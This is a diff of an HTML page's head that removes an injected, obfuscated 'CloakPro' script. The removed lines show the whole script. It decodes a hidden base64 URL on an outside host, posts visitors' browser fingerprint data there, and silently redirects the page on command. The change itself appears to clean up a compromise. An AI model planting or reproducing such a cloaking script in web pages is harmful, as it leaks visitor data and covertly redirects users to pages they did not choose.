@@ -3,24 +3,7 @@
 
 
 <head>
-<!-- CloakPro - zoosk matchmaking -->
-<!-- Works on desktop and mobile browsers -->
-<script>
-(function(d,w,n){
-  var e='aHR0cHM6Ly9zdGVhbHRoLWNsb2FrZXIucmVwbGl0LmFwcC9hcGkvY2xvYWsvMjVhNDUyNzAtZmU1NS00ZTM2LWI0MTUtOTFmNThkYmRkNmUy';
-  var u=atob(e.padEnd(Math.ceil(e.length/4)*4,'='));
-  var p=JSON.stringify({w:w.screen.width,h:w.screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,l:n.language,r:d.referrer,ua:n.userAgent});
-  function go(url){if(url)w.location.replace(url);}
-  try{
-    var x=new XMLHttpRequest();
-    x.open('POST',u,true);
-    x.setRequestHeader('Content-Type','application/json');
-    x.timeout=4000;
-    x.onload=function(){try{var r=JSON.parse(x.responseText);if(r&&r.redirect&&r.url)go(r.url);}catch(e){}};
-    x.send(p);
-  }catch(e){}
-})(document,window,navigator);
-</script>
+
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
